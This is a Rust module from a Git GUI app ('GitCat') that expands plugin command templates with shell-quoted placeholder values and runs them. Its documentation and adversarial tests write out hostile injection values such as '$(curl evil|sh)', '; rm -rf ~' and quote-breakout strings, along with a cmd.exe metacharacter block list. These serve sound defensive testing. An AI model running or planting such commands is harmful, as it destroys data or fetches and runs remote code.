//! Plugin command EXECUTOR + placeholder-grammar (PER-40).
//!
//! GitCat plugins declare a command as a shell `run` TEMPLATE (e.g.
//! `mytool review --sha {sha} --repo {repo}`). This module expands the
//! template's `{...}` placeholders against a [`PlaceholderCtx`] and runs the
//! result through the platform shell — the SAME invocation shape
//! `tool_settings.rs`'s `run_commit_msg_command` uses (platform shell wrapper
//! `sh -c` / `cmd /C`, stdin nulled via `procutil::output_with_timeout`, no
//! console window, a bounded timeout, ANSI-stripped stdout), so plugin authors
//! can write a full command line with args/pipes exactly like a difftool `cmd`.
//!
//! Like the rest of GitCat, this talks to NO AI and has no special powers: a
//! plugin command is just a user/plugin-authored shell command GitCat runs in
//! the repo — the same trust boundary as `tool_settings.rs`'s commit-message
//! command and difftool/mergetool `cmd` strings.
//!
//! ## Security model — the whole point of the placeholder grammar
//!
//! The template body is authored by the plugin (semi-trusted: it is the
//! plugin's own command, and its own `$(...)`/backticks/pipes are meant to
//! run). But the VALUES substituted into the placeholders are UNTRUSTED
//! attacker-controllable DATA: a branch/tag/ref name, a file path, a repo
//! path, and diff CONTENT all come from whatever repository the user opened,
//! which a malicious project can craft freely (a branch literally named
//! `; rm -rf ~`, a file named `$(curl evil|sh)`, diff text full of backticks).
//!
//! Every substituted value is therefore passed through [`shell_quote`], which
//! POSIX-single-quotes it so the shell treats it as one inert literal argument
//! — it can never break out of its argument, start a new command, or trigger
//! expansion. [`expand_placeholders`] is also a strict SINGLE-PASS scanner: a
//! value that itself contains the text `{repo}` (e.g. inside a diff) is NEVER
//! re-scanned, so an attacker cannot smuggle a second placeholder through a
//! first one's value. Both properties are covered by the adversarial tests
//! below (including one that actually runs the expansion through `sh -c` and
//! asserts the value round-trips as literal data with no side effect).
//!
//! ## Platform shell + the Windows quoting caveat (READ THIS)
//!
//! On unix the executor runs `sh -c <expanded>`, and [`shell_quote`] produces
//! POSIX single-quoting, which is a total, well-defined neutralization: inside
//! `'...'` every byte except `'` is literal, and `'` is emitted as the classic
//! `'\''` (close-quote, escaped-quote, reopen-quote) sequence.
//!
//! On WINDOWS the executor runs `cmd /C <expanded>` — but [`shell_quote`] still
//! emits POSIX single-quoting, which `cmd.exe` does NOT interpret the same way
//! (`cmd` does not treat `'` as a quote at all; it uses `"` and `^`, and its
//! metacharacters — `&`, `|`, `%`, `^`, `<`, `>` — follow entirely different
//! rules). So the single-quoted form is NOT a robust neutralization under
//! `cmd.exe`, and this executor does not attempt a bulletproof `cmd` quoter
//! (there isn't a simple correct one). Mitigations / rationale:
//!   * Most plugin `run` templates people write are POSIX-shell one-liners
//!     that pipe git output to a tool; on Windows those already assume a
//!     POSIX-ish shell (Git-Bash/WSL) on PATH, not raw `cmd`.
//!   * The value is still wrapped, so ordinary spaces/paths behave; the risk
//!     is specifically an attacker-controlled value containing `cmd`
//!     metacharacters.
//! Because that single-quoting is NOT a robust `cmd.exe` neutralization,
//! [`run_template`] FAILS CLOSED on Windows: before running, it rejects the
//! command if any substituted value contains a `cmd` metacharacter
//! ([`windows_cmd_unsafe`] — `& | < > ^ % ! "`, CR/LF) that could break out.
//! So a hostile branch/ref/file name cannot inject on Windows, at the cost of
//! refusing some legitimate values (and any `{diff}`, which routinely contains
//! such characters) until the proper fix lands. Unix is unaffected: `sh -c`
//! honors the single-quoting fully. The proper Windows fix (route through a
//! bundled POSIX shell, or a `cmd`/PowerShell-correct quoter) is deferred — see
//! "Deferred hardening" below.
//!
//! ## Deferred hardening (tracked in PER-48, the plugin security model)
//!
//! Conscious gaps in THIS foundation, closed when the security model lands,
//! documented here so they are visible decisions rather than silent holes:
//!   * **No snapshot before mutation.** [`run_plugin_command`] shells out to an
//!     arbitrary command that can freely mutate the repo (`git reset --hard`,
//!     `checkout`, even `rm -rf` the worktree) WITHOUT first taking a
//!     `crate::safety::snapshot`. GitCat's snapshot-before-mutation guarantee
//!     (global Undo) therefore does NOT yet cover plugin-invoked mutations. The
//!     registry declares `PreMutation`/`PostMutation` hook events but the
//!     executor does not snapshot; wiring that is deferred.
//!   * **Flag/argument injection.** [`shell_quote`] stops shell-metacharacter
//!     injection but does NOT change argument boundaries: an untrusted value
//!     beginning with `-` (a branch named `--upload-pack=…`, a ref `-n`) is
//!     still delivered to the invoked tool as an OPTION. Plugin authors should
//!     put a `--` end-of-options separator before untrusted placeholders
//!     (`git checkout -- {branch}`); quoting alone can't fix this generically.
//!   * **Full environment inheritance.** The plugin subprocess inherits
//!     GitCat's whole environment (no `env_clear`). Defensible under the
//!     semi-trusted-author model, but if GitCat ever holds a credential in its
//!     env, a plugin command could read it; a curated env would be needed then.
//!
//! ## Duplicated small helper
//!
//! `strip_ansi` is copied (minimally) from `tool_settings.rs`, where it is a
//! private `fn` (not `pub`, so not shareable across modules without widening
//! its visibility). This follows the codebase's own stated convention of
//! "duplicating small per-module helpers rather than reaching across module
//! boundaries" (see `workdir.rs`'s module doc).

use serde::{Deserialize, Serialize};
use tauri::{AppHandle, Wry};

use crate::procutil::NoConsoleWindowExt;

// ---------------------------------------------------------------------------
// INTEGRATION (lib.rs) — apply these TWO edits once `plugin_registry` lands.
// They are intentionally NOT applied here because `run_plugin_command`
// depends on `crate::plugin_registry::find_command`, which is written in
// parallel; wiring it before that module exists would break the build.
//
//   1. In the module list near the top of lib.rs, add:
//          pub mod plugin_exec; // PER-40: plugin command executor + placeholder grammar
//
//   2. Inside `collect_commands![ ... ]` in `specta_builder()`, add:
//          plugin_exec::run_plugin_command,
// ---------------------------------------------------------------------------

/// Values substituted into a plugin command's `run` template. Every field is
/// optional / possibly-empty: the frontend fills in only the placeholders a
/// given command's declared `context` needs, and any placeholder whose value
/// is absent expands to an empty string (see [`expand_placeholders`]).
///
/// `repo` does double duty: it is BOTH the `{repo}` placeholder value AND the
/// working directory the command runs in (see [`run_plugin_command`]) — a
/// plugin command with no repo has nowhere sensible to run.
///
/// `camelCase` for the TS bindings. `gitref` is renamed to `ref` on the wire
/// so the JS field matches the `{ref}` token (the Rust field can't be named
/// `ref`, a reserved keyword). Container-level `#[serde(default)]` (+ derived
/// `Default`) lets the frontend send only the subset of fields it has.
#[derive(Serialize, Deserialize, Clone, Debug, Default, specta::Type)]
#[serde(rename_all = "camelCase", default)]
pub struct PlaceholderCtx {
    /// `{sha}` — a commit id (Commit context).
    pub sha: Option<String>,
    /// `{file}` — a single file path (File context).
    pub file: Option<String>,
    /// `{files}` — several file paths; expands to each path shell-quoted,
    /// space-joined (File context, multi-select).
    pub files: Vec<String>,
    /// `{diff}` — diff text. UNTRUSTED repo content; quoted like everything else.
    pub diff: Option<String>,
    /// `{repo}` — the repository path. Also the command's working directory.
    pub repo: Option<String>,
    /// `{branch}` — a branch name. UNTRUSTED (attacker can name a branch anything).
    pub branch: Option<String>,
    /// `{ref}` — a full ref / tag / symbolic ref. UNTRUSTED. (Rust field
    /// `gitref`; wire/TS field `ref` — see the struct doc.)
    #[serde(rename = "ref")]
    pub gitref: Option<String>,
}

/// The captured result of running a plugin command. `camelCase` for bindings.
#[derive(Serialize, Deserialize, Clone, Debug, specta::Type)]
#[serde(rename_all = "camelCase")]
pub struct CommandOutput {
    /// stdout, ANSI-stripped (CLIs stream spinner/cursor escapes even when
    /// piped — see [`strip_ansi`]). NOT trimmed: a plugin may care about exact
    /// bytes/trailing newlines, unlike the commit-message generator.
    pub stdout: String,
    /// The process exit code, or `None` if it was killed by a signal.
    pub exit_code: Option<i32>,
    /// `true` iff the process exited 0.
    pub success: bool,
}

/// Longer than git's 20s `SUBPROCESS_TIMEOUT`: a plugin command can be an
/// arbitrary user tool (a linter, a test run, an AI round-trip) that
/// legitimately takes a while — but still bounded, so a hung plugin becomes a
/// visible failure rather than a forever-spinning action.
pub const PLUGIN_CMD_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(120);

// ---------------------------------------------------------------------------
// STAR: the pure placeholder grammar (no I/O, exhaustively tested below)
// ---------------------------------------------------------------------------

/// POSIX single-quote `s` so a shell (`sh -c`) treats it as ONE inert literal
/// argument — no word-splitting, no glob, no variable/command expansion, no
/// way to break out of the argument. The whole string is wrapped in `'...'`;
/// an embedded single quote (the one character single-quoting can't contain)
/// is emitted as the classic `'\''` — close-quote, a backslash-escaped literal
/// quote, reopen-quote. An empty string becomes `''` (a real empty argument).
///
/// See the module doc's "Windows quoting caveat": this is POSIX-correct, and
/// the executor's unix path uses `sh -c`; the Windows `cmd /C` path does NOT
/// interpret single-quoting the same way, a documented known limitation.
pub fn shell_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for c in s.chars() {
        if c == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

/// Quote an `Option` value: `Some(v)` -> [`shell_quote`]`(v)` (note `Some("")`
/// -> `''`, a real empty arg), `None` -> empty string (nothing inserted).
fn quote_opt(v: &Option<String>) -> String {
    match v {
        Some(s) => shell_quote(s),
        None => String::new(),
    }
}

/// `{files}`: each path shell-quoted, space-joined. Empty list -> empty string.
fn quote_files(files: &[String]) -> String {
    files.iter().map(|f| shell_quote(f)).collect::<Vec<_>>().join(" ")
}

/// Map a recognized token name to its shell-quoted value; an UNRECOGNIZED name
/// -> empty string (documented "unknown token expands to empty").
fn substitute(name: &str, ctx: &PlaceholderCtx) -> String {
    match name {
        "sha" => quote_opt(&ctx.sha),
        "file" => quote_opt(&ctx.file),
        "files" => quote_files(&ctx.files),
        "diff" => quote_opt(&ctx.diff),
        "repo" => quote_opt(&ctx.repo),
        "branch" => quote_opt(&ctx.branch),
        "ref" => quote_opt(&ctx.gitref),
        _ => String::new(),
    }
}

/// Parse a leading placeholder off `rest` (which must start with `{`). The
/// grammar is deliberately narrow: `{` + one-or-more ASCII **lowercase
/// letters** + `}`. Returns `(name, bytes_consumed_including_braces)` on a
/// match, else `None`.
///
/// Restricting the inside to `[a-z]+` (all seven real tokens are lowercase
/// letters) keeps the scanner from swallowing a template's own literal braces:
/// a POSIX `${HOME}` / `${1}` (uppercase or digit -> no match) and an
/// `awk '{print $1}'` (space inside -> no match) are left untouched. See the
/// `literal_braces_left_alone` test.
fn parse_token(rest: &str) -> Option<(&str, usize)> {
    let bytes = rest.as_bytes();
    debug_assert_eq!(bytes[0], b'{');
    let mut j = 1;
    while j < bytes.len() && bytes[j].is_ascii_lowercase() {
        j += 1;
    }
    // Need at least one letter (j > 1) AND a closing brace right after.
    if j > 1 && j < bytes.len() && bytes[j] == b'}' {
        Some((&rest[1..j], j + 1))
    } else {
        None
    }
}

/// Expand `{sha} {file} {files} {diff} {repo} {branch} {ref}` in `template`
/// against `ctx`. Each recognized token is replaced by its **shell-quoted**
/// value; a token whose ctx value is absent — and any UNRECOGNIZED `{name}` —
/// expands to the empty string.
///
/// SINGLE PASS by construction: the scanner walks `template` left to right and
/// copies substituted values straight into the output without ever re-scanning
/// them, so a value that itself contains `{...}` text (a diff, a crafted branch
/// name) can NOT introduce a further placeholder. Text that isn't a valid
/// `{lowercase}` token (a stray `{`, `${VAR}`, `{print $1}`, `{}`) is copied
/// through verbatim.
///
/// This function is PURE (no I/O) and is the security-critical core; see the
/// exhaustive adversarial tests at the bottom of the module.
pub fn expand_placeholders(template: &str, ctx: &PlaceholderCtx) -> String {
    let mut out = String::with_capacity(template.len());
    let mut i = 0usize;
    while i < template.len() {
        let rest = &template[i..];
        // `{` is ASCII, so it can only ever appear at a char boundary (never
        // inside a multibyte sequence) — safe to test the first byte here.
        if rest.as_bytes()[0] == b'{' {
            if let Some((name, consumed)) = parse_token(rest) {
                out.push_str(&substitute(name, ctx));
                i += consumed;
                continue;
            }
        }
        // Not a token: copy exactly one (possibly multibyte) char and advance.
        let ch = rest.chars().next().expect("i < len, so a char exists");
        out.push(ch);
        i += ch.len_utf8();
    }
    out
}

/// `cmd.exe` metacharacters that POSIX single-quoting does NOT neutralize
/// (`cmd` ignores `'`). Used ONLY on the Windows executor path to fail closed.
const WINDOWS_CMD_META: &[char] = &['&', '|', '<', '>', '^', '%', '!', '"', '\r', '\n'];

/// True if `s` contains a character `cmd.exe` treats as a metacharacter
/// regardless of our single-quoting — i.e. a value that could break out of its
/// argument under `cmd /C`. Pure + tested on every platform; its *use* in
/// [`run_template`] is `cfg!(windows)`-gated (see the module doc's Windows
/// caveat), but the logic is exercised by unit tests everywhere.
pub fn windows_cmd_unsafe(s: &str) -> bool {
    s.chars().any(|c| WINDOWS_CMD_META.contains(&c))
}

/// The `(token, value)` pairs that will be substituted, for the Windows
/// fail-closed scan. Windows-only (dead on unix, hence `cfg`-gated).
#[cfg(windows)]
fn ctx_values(ctx: &PlaceholderCtx) -> Vec<(&'static str, &str)> {
    let mut v: Vec<(&'static str, &str)> = Vec::new();
    if let Some(s) = &ctx.sha {
        v.push(("sha", s));
    }
    if let Some(s) = &ctx.file {
        v.push(("file", s));
    }
    for f in &ctx.files {
        v.push(("files", f));
    }
    if let Some(s) = &ctx.diff {
        v.push(("diff", s));
    }
    if let Some(s) = &ctx.repo {
        v.push(("repo", s));
    }
    if let Some(s) = &ctx.branch {
        v.push(("branch", s));
    }
    if let Some(s) = &ctx.gitref {
        v.push(("ref", s));
    }
    v
}

// ---------------------------------------------------------------------------
// Executor
// ---------------------------------------------------------------------------

/// Expand `template` against `ctx`, then run it through the platform shell in
/// `cwd` with the standard hardening — stdin nulled + stdout/stderr piped +
/// bounded [`PLUGIN_CMD_TIMEOUT`] (all via `procutil::output_with_timeout`,
/// the same helper `tool_settings.rs` uses) and no flashed console window on
/// Windows. stdout is ANSI-stripped; the exit code / success flag are returned
/// as-is (a non-zero exit is a normal, reportable outcome, NOT an `Err` — an
/// `Err` here means the command could not be launched or timed out).
///
/// Routed through `sh -c` (unix) / `cmd /C` (Windows) so a plugin `run` string
/// can be a full command line with args/pipes, exactly like a difftool `cmd`.
/// See the module doc for the Windows single-quoting caveat.
pub fn run_template(template: &str, cwd: &str, ctx: &PlaceholderCtx) -> Result<CommandOutput, String> {
    use std::process::Command;
    // Windows fail-closed guard (see the module doc's Windows caveat): our POSIX
    // single-quoting does not bind cmd.exe, so refuse rather than risk injection
    // from an untrusted value. Unix (`sh -c`) is fully protected by the quoting
    // and skips this entirely.
    #[cfg(windows)]
    {
        if let Some((tok, _)) = ctx_values(ctx).into_iter().find(|(_, v)| windows_cmd_unsafe(v)) {
            return Err(format!(
                "Refusing to run the plugin command on Windows: the {tok} value contains a character \
                 unsafe for cmd.exe (one of & | < > ^ % ! \" or a newline). This is a known Windows \
                 limitation of GitCat's plugin executor."
            ));
        }
    }
    let script = expand_placeholders(template, ctx);
    let mut command = if cfg!(windows) {
        let mut c = Command::new("cmd");
        c.arg("/C").arg(&script);
        c
    } else {
        let mut c = Command::new("sh");
        c.arg("-c").arg(&script);
        c
    };
    command.current_dir(cwd).no_console_window();
    let out = crate::procutil::output_with_timeout(command, PLUGIN_CMD_TIMEOUT)
        .map_err(|e| format!("Could not run the plugin command: {e}"))?;
    Ok(CommandOutput {
        // Strip ANSI: CLIs (ollama, many linters, progress bars) stream cursor/
        // colour escapes even when their stdout is a pipe, not a TTY.
        stdout: strip_ansi(&String::from_utf8_lossy(&out.stdout)),
        exit_code: out.status.code(),
        success: out.status.success(),
    })
}

/// Run a plugin's command by id. Loads it from the registry (written in
/// parallel — [`crate::plugin_registry::find_command`], which returns `None`
/// for a command that is missing OR disabled), resolves the working directory
/// from `ctx.repo`, and shells out via [`run_template`].
///
/// `async fn` + `run_blocking` keeps the (potentially long, up to
/// [`PLUGIN_CMD_TIMEOUT`]) subprocess wait off Tauri's main thread, exactly
/// like `tool_settings::generate_commit_message`. The cheap registry lookup
/// runs inline first (same shape as that command loading its JSON settings
/// before the `run_blocking`).
///
/// JS: `commands.runPluginCommand(pluginId, commandId, ctx)`.
#[tauri::command]
#[specta::specta]
pub async fn run_plugin_command(
    app: AppHandle<Wry>,
    plugin_id: String,
    command_id: String,
    ctx: PlaceholderCtx,
) -> Result<CommandOutput, String> {
    let command = crate::plugin_registry::find_command(&app, &plugin_id, &command_id)?
        .ok_or_else(|| format!("Plugin command {plugin_id}/{command_id} was not found or is disabled."))?;
    // `repo` is required: it is both the {repo} value and the cwd to run in.
    let cwd = ctx
        .repo
        .clone()
        .filter(|p| !p.trim().is_empty())
        .ok_or_else(|| "No repository path was provided for the plugin command.".to_string())?;
    let run = command.run;
    crate::blocking::run_blocking(move || run_template(&run, &cwd, &ctx)).await
}

// ---------------------------------------------------------------------------
// Duplicated small helper (see module doc): ANSI stripping, copied from
// tool_settings.rs (private there). Char-based so multibyte UTF-8 survives.
// ---------------------------------------------------------------------------

fn strip_ansi(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\u{1b}' {
            out.push(c);
            continue;
        }
        match chars.peek().copied() {
            // CSI (ESC [ … final byte in @..~) — colours, cursor moves.
            Some('[') => {
                chars.next();
                while let Some(&pc) = chars.peek() {
                    chars.next();
                    if ('@'..='~').contains(&pc) {
                        break;
                    }
                }
            }
            // OSC (ESC ] … terminated by BEL or ST `ESC \`).
            Some(']') => {
                chars.next();
                while let Some(c2) = chars.next() {
                    if c2 == '\u{7}' {
                        break;
                    }
                    if c2 == '\u{1b}' {
                        if chars.peek() == Some(&'\\') {
                            chars.next();
                        }
                        break;
                    }
                }
            }
            // Lone ESC or a two-char sequence — drop the ESC (and next char).
            _ => {
                chars.next();
            }
        }
    }
    out
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // ---- shell_quote --------------------------------------------------------

    #[test]
    fn shell_quote_basics() {
        assert_eq!(shell_quote("word"), "'word'");
        assert_eq!(shell_quote(""), "''"); // empty -> a real empty argument
        assert_eq!(shell_quote("a b c"), "'a b c'");
        assert_eq!(shell_quote("with\nnewline"), "'with\nnewline'");
    }

    #[test]
    fn shell_quote_embedded_single_quote_uses_the_classic_escape() {
        // ' -> '\''  (close, escaped-quote, reopen)
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
        assert_eq!(shell_quote("'"), "''\\'''");
    }

    #[test]
    fn shell_quote_neutralizes_every_shell_metacharacter() {
        // Backticks, $(), $VAR, pipes, redirects, globs, semicolons — all inert
        // inside single quotes.
        assert_eq!(shell_quote("`whoami`"), "'`whoami`'");
        assert_eq!(shell_quote("$(rm -rf /)"), "'$(rm -rf /)'");
        assert_eq!(shell_quote("$HOME"), "'$HOME'");
        assert_eq!(shell_quote("a | b > c & d ; e"), "'a | b > c & d ; e'");
        assert_eq!(shell_quote("*.rs"), "'*.rs'");
    }

    // ---- expand_placeholders: happy path -----------------------------------

    #[test]
    fn every_token_substitutes_its_quoted_value() {
        let ctx = PlaceholderCtx {
            sha: Some("abc123".into()),
            file: Some("src/a.rs".into()),
            diff: Some("+added\n-removed".into()),
            repo: Some("/home/me/proj".into()),
            branch: Some("feature/x".into()),
            gitref: Some("refs/tags/v1".into()),
            ..Default::default()
        };
        assert_eq!(
            expand_placeholders("{sha} {file} {diff} {repo} {branch} {ref}", &ctx),
            "'abc123' 'src/a.rs' '+added\n-removed' '/home/me/proj' 'feature/x' 'refs/tags/v1'"
        );
    }

    #[test]
    fn files_token_quotes_each_and_space_joins() {
        let ctx = PlaceholderCtx {
            files: vec!["a.rs".into(), "dir/b c.rs".into(), "weird'name.rs".into()],
            ..Default::default()
        };
        assert_eq!(expand_placeholders("{files}", &ctx), "'a.rs' 'dir/b c.rs' 'weird'\\''name.rs'");
    }

    #[test]
    fn empty_files_and_none_scalars_expand_to_nothing() {
        let ctx = PlaceholderCtx::default();
        assert_eq!(expand_placeholders("[{files}]", &ctx), "[]");
        assert_eq!(expand_placeholders("[{sha}]", &ctx), "[]");
        assert_eq!(expand_placeholders("[{branch}]", &ctx), "[]");
    }

    #[test]
    fn none_is_empty_but_some_empty_string_is_an_explicit_empty_arg() {
        let ctx = PlaceholderCtx { sha: None, file: Some(String::new()), ..Default::default() };
        assert_eq!(expand_placeholders("[{sha}][{file}]", &ctx), "[]['']");
    }

    #[test]
    fn unknown_token_expands_to_empty() {
        let ctx = PlaceholderCtx { sha: Some("x".into()), ..Default::default() };
        assert_eq!(expand_placeholders("a{foo}b{sha}c{bar}d", &ctx), "ab'x'cd");
    }

    #[test]
    fn adjacent_tokens_and_surrounding_text() {
        let ctx = PlaceholderCtx { sha: Some("A".into()), branch: Some("B".into()), ..Default::default() };
        assert_eq!(expand_placeholders("{sha}{branch}", &ctx), "'A''B'");
        assert_eq!(expand_placeholders("x={sha};y={branch}", &ctx), "x='A';y='B'");
    }

    #[test]
    fn ref_token_maps_to_the_gitref_field() {
        let ctx = PlaceholderCtx { gitref: Some("HEAD~3".into()), ..Default::default() };
        assert_eq!(expand_placeholders("show {ref}", &ctx), "show 'HEAD~3'");
    }

    #[test]
    fn multibyte_utf8_survives_inside_and_outside_tokens() {
        let ctx = PlaceholderCtx { file: Some("にゃ.txt".into()), ..Default::default() };
        assert_eq!(expand_placeholders("猫{file}猫", &ctx), "猫'にゃ.txt'猫");
    }

    // ---- expand_placeholders: literal-brace / non-token robustness ----------

    #[test]
    fn literal_braces_left_alone() {
        let ctx = PlaceholderCtx::default();
        // A template's own POSIX constructs must NOT be eaten.
        assert_eq!(expand_placeholders("awk '{print $1}'", &ctx), "awk '{print $1}'");
        assert_eq!(expand_placeholders("echo ${HOME}", &ctx), "echo ${HOME}"); // uppercase -> not a token
        assert_eq!(expand_placeholders("${1}", &ctx), "${1}"); // digit -> not a token
        assert_eq!(expand_placeholders("{}", &ctx), "{}"); // empty braces
        assert_eq!(expand_placeholders("a{sha", &ctx), "a{sha"); // unterminated
        assert_eq!(expand_placeholders("{Sha}", &ctx), "{Sha}"); // uppercase letter -> not a token
        assert_eq!(expand_placeholders("{sha_x}", &ctx), "{sha_x}"); // underscore -> not [a-z]+
    }

    // ---- expand_placeholders: ADVERSARIAL (the security-critical cases) -----

    #[test]
    fn adversarial_branch_named_rm_rf_stays_a_single_inert_literal() {
        let ctx = PlaceholderCtx { branch: Some("; rm -rf ~".into()), ..Default::default() };
        // The ; is INSIDE the single quotes — the shell can't start a new command.
        assert_eq!(expand_placeholders("git checkout {branch}", &ctx), "git checkout '; rm -rf ~'");
    }

    #[test]
    fn adversarial_file_with_spaces_quotes_and_metachars() {
        let ctx = PlaceholderCtx {
            file: Some("my file's \"$(id)\" `whoami`.txt".into()),
            ..Default::default()
        };
        assert_eq!(
            expand_placeholders("open {file}", &ctx),
            "open 'my file'\\''s \"$(id)\" `whoami`.txt'"
        );
    }

    #[test]
    fn adversarial_command_substitution_and_backticks_are_inert() {
        let ctx = PlaceholderCtx {
            repo: Some("$(touch pwned)".into()),
            gitref: Some("`reboot`".into()),
            ..Default::default()
        };
        assert_eq!(expand_placeholders("{repo} {ref}", &ctx), "'$(touch pwned)' '`reboot`'");
    }

    #[test]
    fn adversarial_quote_breakout_attempt_is_reclosed_safely() {
        // A value engineered to try to close our quote and inject a command.
        let ctx = PlaceholderCtx { branch: Some("foo'; rm -rf ~; echo 'bar".into()), ..Default::default() };
        // Every embedded ' becomes '\'' so the string never actually opens up.
        assert_eq!(expand_placeholders("{branch}", &ctx), "'foo'\\''; rm -rf ~; echo '\\''bar'");
    }

    #[test]
    fn a_value_containing_placeholder_text_is_not_re_expanded() {
        // THE single-pass guarantee: diff content full of {repo}/{sha}/{diff}
        // must be copied through literally, never treated as further tokens.
        let ctx = PlaceholderCtx {
            diff: Some("has {repo} and {sha} and even {diff} inside".into()),
            repo: Some("SECRET_REPO".into()),
            sha: Some("SECRET_SHA".into()),
            ..Default::default()
        };
        let out = expand_placeholders("tool {diff}", &ctx);
        assert_eq!(out, "tool 'has {repo} and {sha} and even {diff} inside'");
        // The real repo/sha values did NOT leak in via re-expansion.
        assert!(!out.contains("SECRET_REPO"), "re-expansion leaked repo: {out}");
        assert!(!out.contains("SECRET_SHA"), "re-expansion leaked sha: {out}");
    }

    #[test]
    fn adversarial_filenames_in_files_each_stay_inert() {
        let ctx = PlaceholderCtx {
            files: vec!["a b.txt".into(), "x';rm -rf ~;'.txt".into(), "$(id).txt".into()],
            ..Default::default()
        };
        assert_eq!(
            expand_placeholders("{files}", &ctx),
            "'a b.txt' 'x'\\'';rm -rf ~;'\\''.txt' '$(id).txt'"
        );
    }

    // ---- windows_cmd_unsafe (the Windows fail-closed guard) ----------------

    #[test]
    fn windows_cmd_unsafe_flags_cmd_metacharacters() {
        // Every character cmd.exe would act on regardless of our single-quoting.
        for bad in ["a & b", "a | b", "in < f", "out > f", "a ^ b", "50% off", "v!x", "say \"hi\"", "line\r", "line\n"] {
            assert!(windows_cmd_unsafe(bad), "should flag: {bad:?}");
        }
    }

    #[test]
    fn windows_cmd_unsafe_allows_ordinary_values() {
        // Ordinary refs/paths — and note `;` is NOT a cmd command-chainer, so a
        // single-quoted "; rm -rf ~" cannot inject under cmd (it is inert on
        // unix too). Only the chainers/redirectors above are rejected.
        for ok in ["feature/x", "clean-branch_1.2", "src/a.rs", "; rm -rf ~", "a'b", "HEAD~3"] {
            assert!(!windows_cmd_unsafe(ok), "should allow: {ok:?}");
        }
    }

    // ---- strip_ansi (the duplicated helper) --------------------------------

    #[test]
    fn strip_ansi_drops_escapes_keeps_text_and_multibyte() {
        let raw = "\u{1b}[?25l\u{1b}[1G\u{1b}[K done \u{1b}[?25h";
        assert_eq!(strip_ansi(raw).trim(), "done");
        assert_eq!(strip_ansi("\u{1b}[32mにゃ\u{1b}[0m"), "にゃ");
        assert_eq!(strip_ansi("plain"), "plain");
    }

    // ---- run_template: real end-to-end shell inertness proof (unix) ---------
    //
    // These ACTUALLY run the expanded template through `sh -c` and assert an
    // adversarial value round-trips as literal data with no side effect —
    // proving shell_quote's neutralization end to end, not just structurally.
    // Unix-only (POSIX shell syntax); the Rust CI job runs on Linux. The
    // Windows `cmd /C` path has a documented quoting caveat (see module doc).

    #[cfg(unix)]
    fn tmp_cwd(tag: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!(
            "gitcat-plugin-exec-{tag}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()
        ));
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[cfg(unix)]
    #[test]
    fn run_template_captures_stdout_exit_and_success() {
        let dir = tmp_cwd("ok");
        let ctx = PlaceholderCtx { sha: Some("hello".into()), ..Default::default() };
        let out = run_template("printf %s {sha}", dir.to_str().unwrap(), &ctx).expect("should run");
        assert_eq!(out.stdout, "hello");
        assert_eq!(out.exit_code, Some(0));
        assert!(out.success);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn run_template_reports_a_nonzero_exit_without_erroring() {
        let dir = tmp_cwd("nonzero");
        let ctx = PlaceholderCtx::default();
        let out = run_template("exit 7", dir.to_str().unwrap(), &ctx).expect("launch should succeed");
        assert_eq!(out.exit_code, Some(7));
        assert!(!out.success);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn run_template_passes_an_adversarial_branch_as_literal_data() {
        let dir = tmp_cwd("adv-branch");
        let ctx = PlaceholderCtx { branch: Some("; rm -rf ~".into()), ..Default::default() };
        // If quoting failed, `; rm -rf ~` would run as its own command instead
        // of being printed back verbatim.
        let out = run_template("printf %s {branch}", dir.to_str().unwrap(), &ctx).expect("should run");
        assert_eq!(out.stdout, "; rm -rf ~");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn run_template_does_not_execute_command_substitution_in_a_value() {
        let dir = tmp_cwd("adv-subst");
        // The value is `$(touch pwned)`; if it were NOT inert, the file `pwned`
        // would be created in cwd. We assert both: literal echo AND no file.
        let ctx = PlaceholderCtx { gitref: Some("$(touch pwned)".into()), ..Default::default() };
        let out = run_template("printf %s {ref}", dir.to_str().unwrap(), &ctx).expect("should run");
        assert_eq!(out.stdout, "$(touch pwned)");
        assert!(!dir.join("pwned").exists(), "command substitution must NOT have executed");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn run_template_keeps_a_quote_breakout_value_inert() {
        let dir = tmp_cwd("adv-breakout");
        let ctx = PlaceholderCtx { branch: Some("a'; touch pwned; echo 'b".into()), ..Default::default() };
        let out = run_template("printf %s {branch}", dir.to_str().unwrap(), &ctx).expect("should run");
        assert_eq!(out.stdout, "a'; touch pwned; echo 'b");
        assert!(!dir.join("pwned").exists(), "breakout attempt must NOT have executed");
        let _ = std::fs::remove_dir_all(&dir);
    }
}
